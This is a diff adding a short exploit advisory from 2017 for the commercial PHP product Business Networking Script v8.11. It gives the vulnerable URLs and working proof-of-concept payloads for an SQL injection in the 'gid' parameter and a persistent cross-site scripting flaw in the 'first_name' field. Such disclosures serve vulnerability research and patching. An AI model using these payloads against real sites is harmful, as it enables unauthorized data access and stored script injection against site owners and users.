@@ -1,0 +1,26 @@
+# Exploit Title : ----------- : Business Networking Script v8.11- SQLi &
+Persistent Cross Site Scripting
+# Author : -----------------  : Ahmet Gurel
+# Google Dork : ---------  :    -
+# Date : -------------------- : 16/01/2017
+# Type : -------------------- : webapps
+# Platform : --------------- : PHP
+# Vendor Homepage : http://itechscripts.com/business-networking-script/
+# Sofware Price and Demo : $299.00
+http://professional-network.itechscripts.com
+
+ ########## 1-SQL Injection ##########
+
+##### Vulnerable Parameter Type : GET
+##### Vulnerable Parameter : gid
+##### Vulnerable URL :
+http://localhost/[PATH]/show_group_members.php?gid=[SQLi]
+##### SQLi Parameter : ' OR '1'='1
+
+
+
+########## 2-Persistent XSS Payload ##########
+
+##### Vulnerable URL : http://localhost/[PATH]/home.php
+##### Vuln. Parameter: first_name=
+##### PAYLOAD : '"--></style></Script><Script>alert(1)</Script>
